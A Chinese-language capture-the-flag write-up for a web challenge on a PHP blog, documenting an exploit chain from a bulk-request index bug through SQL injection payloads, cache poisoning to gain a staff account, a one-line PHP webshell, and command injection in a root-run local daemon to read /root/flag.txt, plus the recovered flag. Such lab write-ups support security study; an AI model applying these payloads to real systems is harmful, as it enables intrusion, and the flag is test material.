# cwp

## 题目信息

- 题目类型：Web
- 题目描述：flag 在 `/root/flag.txt`，容器地址 `https://eci-2ze5vrmvgb6yflok91ug.cloudeci1.ichunqiu.com:80`
- 附件或题目入口：`blog-src_7827b45b9013e92261f86a1150f32462.zip`（SimpleBlog PHP 源码）

## 解题思路

源码是一个 PHP + MariaDB 的极简博客，前台只暴露文章、评论和标签，真正复杂的是 `engine.php` 里的内部路由表和 `bulk.php` 的批量执行器。通读后有几个点很可疑：`posts_lookup()` 里 `owner_not_in` 直接拼进 SQL；`snapshot_write()` 会按 `status_kind` 触发钩子；`hook_changeset_promote()` 能把站点配置写进 `site_config` 并设置 `PUBLISH_AS`；`manage_dispatch()` 里有 `skin-editor` 任意 PHP 写入。

线上还多出 `/api/archive`、`/api/comments/recent` 两个只读路由，说明部署版本和附件基本一致但有增量。先按源码审计找权限链，再用黑盒确认。

尝试过直接读库里的 staff 哈希和常见口令，但登录名是随机 10 位 hex，bcrypt 也跑不动；`LOAD_FILE`/`INTO OUTFILE` 分别返回 NULL 和 1045，数据库没有 FILE 权限。于是把重点放回 `bulk_engine()` 的执行顺序，最终从索引错位一路打到 root 面板。

## 解题过程

### 1. 批量执行器的索引错位

`bulk_engine()` 先遍历 ops 建 `$matched` 和 `$checked` 两个数组。`build_op()` 失败的操作只写入 `$checked`，不写入 `$matched`，后面再按同一个下标取 handler 就会错位：

```php
foreach ($ops as $op) {
    if (isset($op["err"])) { $checked[] = $op; continue; }   // 没有 $matched[]
    $bind = route_bind($op);
    $matched[] = $bind;
    ...
}
```

构造三个外层 op：一个 `route` 为 `http://` 的非法项、一个 `/api/articles/1/comments`（合法 POST，`data` 里塞 `ops`）、一个 `/api/bulk`。错位后 `/api/bulk` 的 handler 拿到 comments 的合法 op，`exec_bulk()` 被调用，内层 ops 不再受 `bulk.php` 的“只允许 POST/PUT/PATCH/DELETE”限制。

```json
{"ops":[
  {"route":"http://","verb":"POST"},
  {"route":"/api/articles/1/comments","verb":"POST",
   "data":{"id":1,"author":"x","text":"y","ops":[ ... ]}},
  {"route":"/api/bulk","verb":"POST"}
]}
```

内层放一个 GET `/api/stats/summary`，返回里出现 `{"summary":{...}}`，确认嵌套批量成功。

### 2. `omit` 的原始 SQL 拼接

`posts_lookup()` 只对数组形式的 `owner_not_in` 做 `absint`；如果传入的是字符串，会直接 `implode` 进 `owner NOT IN (...)`：

```php
if (!is_array($spec["owner_not_in"])) {
    $ids = implode(",", (array)$spec["owner_not_in"]); // 原样拼接
    $conds[] = "owner NOT IN ($ids)";
}
```

正常 `/api/articles` 路由会把 `omit` 按 `id_list` 清洗成数组，所以直接打不进去。利用同样的错位，把 `/api/drafts` 的 op（该路由不校验 `omit`）绑定到 `/api/articles` 的 handler：

```json
[
  {"route":"http://","verb":"POST"},
  {"route":"/api/drafts","verb":"POST","data":{"omit":"1) AND SLEEP(3)-- -"}},
  {"route":"/api/articles","verb":"GET"}
]
```

响应时间从约 0.25 秒变成 15 秒（5 行数据每行 SLEEP(3)），确认时间盲注。把 payload 换成 UNION：

```sql
1) UNION SELECT 9988,(SELECT login FROM staff_accounts LIMIT 1),'','','','2026-01-01','published','article',0,0-- -
```

从 `articles` 返回值里拿到了真实 staff 登录名 `ebb8270e78`。

### 3. 污染 ROW_CACHE，借钩子拿 staff

`posts_lookup()` 会把结果行写入 `ROW_CACHE`，紧接着 `exec_articles_list()` 对同一批 id 调 `entry_fetch()`，拿到的就是刚缓存的伪造行：

```php
foreach ($rows as $r) cache_remember("entries", (int)$r["id"], $r);
...
$full = entry_fetch((int)$r["id"]);
if ($full && (int)$full["snap_stale"] === 1) snapshot_write($full);
```

构造两条 UNION 行：一条 `status=pending, kind=changeset`，owner 用刚泄露的 staff；另一条 `status=api, kind=reload`。`snapshot_write()` 会分别触发 `hook_changeset_promote()` 和 `hook_api_reload()`。前者通过 `changeset_publish()` 把 `PUBLISH_AS` 设成 staff；后者重放 `CUR_OPS`，此时 `PUBLISH_AS` 还没被清掉，内层 ops 里的 `POST /api/users` 就能以 staff 身份执行。

```sql
1) UNION SELECT 9999,'pwnkey','x','ebb8270e78','x','2030-01-01','pending','changeset',0,1
UNION SELECT 9998,'x','x','x','x','2029-01-01','api','reload',0,1-- -
```

内层最后一项是新建账号，响应的 `followup` 里出现了 `{"draft":{"id":7,...}}`，随后用新账号登录成功：

```json
{"status":1,"login":"pwnx12345","expires":1793462073}
```

### 4. skin-editor 写入 webshell

`manage.php?action=skin-editor` 在 staff 会话下把 `code` 写入 `/var/www/uploads/skins/<name>.php`。写入：

```php
<?php system($_GET["c"]); ?>
```

访问 `/uploads/skins/pwn.php?c=id` 返回：

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

到这里拿到的是 www-data，`/root` 仍然不可读。`sudo` 不存在，MySQL 以 mysql 用户运行，Supervisor 的 socket 是 0700 root，常规提权路径都不通。

### 5. 本地 hpxd 面板拿到 root

`ps` 里有一个 root 运行的 `smrtmond.pl`，`/proc/net/tcp` 显示本机 9443/9444/9446/9447 四个监听端口。请求 9446 的 `/ops/code`，直接把 hpxd 4.17.29 的完整 Perl 源码吐了出来：

```text
hpxd: listening on 9443 9444 9446 9447
```

源码里的 vault 认证可以直接绕：

- 首次请求返回 `Set-Cookie: hpx_id=<token>,<scramble>`；
- 第二次带 `Cookie: hpx_id=<token>,`（scramble 留空）和 Basic 认证，`cloak_store()` 在 `has_cookie` 为真但 scramble 为空时走原样存储；
- Basic 密码里带换行，会通过 `vault_put()` 的 `"$k=$v"` 拼进 session 原文，注入 `master_flag=1`、`otp_done=1`、`login=root`、`zone=hx_9999999999`、`sudo_until=9999999999`；
- `vault_is_master()` 只要求这几个字段，`sudo_until` 在未来就不再校验 `master_digest()`；
- 先用 `/hx_1/` 触发 `vault_rescan()` 刷新缓存，再访问自己的 zone。

`/files/list` 的实现是：

```perl
open my $fh, "-|", "timeout", "-k", "5", $EXEC_SECONDS, "/bin/sh", "-c", "ls -la " . $dir
```

`$dir` 只过滤控制字符，没有过滤 `|`。注意查询串按 `[&;]` 分割，分号会被吃掉，所以用管道：

```text
/hx_9999999999/files/list?path=%7Ccat%20/root/flag.txt
```

hpxd 以 root 运行，返回：

```text
flag{c89e1bdd-d189-4a51-8ff3-29465c731432}
```

再换成 `|/bin/cat /root/flag.txt` 读了一次，结果一致。

## 复现脚本

完整脚本在 `solve/exploit.py`，依赖 `requests`：

```bash
python solve/exploit.py
```

脚本先通过 UNION 注入读出真实 staff 登录名，再走嵌套批量 + 缓存污染创建新 staff，登录后写 `pwn.php`，最后在容器内执行 hpxd 的 vault 注入和 `files/list` 命令注入。使用前把 `TARGET` 换成当前靶机地址；脚本会生成随机 staff 登录名，不会覆盖已有账号。

关键文件：

- `solve/exploit.py`：完整利用链
- `solve/progress.md`：每一步的验证记录
- `solve/flag.txt`：读取到的 flag

## Flag

`flag{c89e1bdd-d189-4a51-8ff3-29465c731432}`

来源：hpxd `/hx_9999999999/files/list` 的 root 命令注入读取 `/root/flag.txt`，`|cat` 与 `|/bin/cat` 两次独立读取一致。

验证状态：已获取；平台提交通过（100 分）。
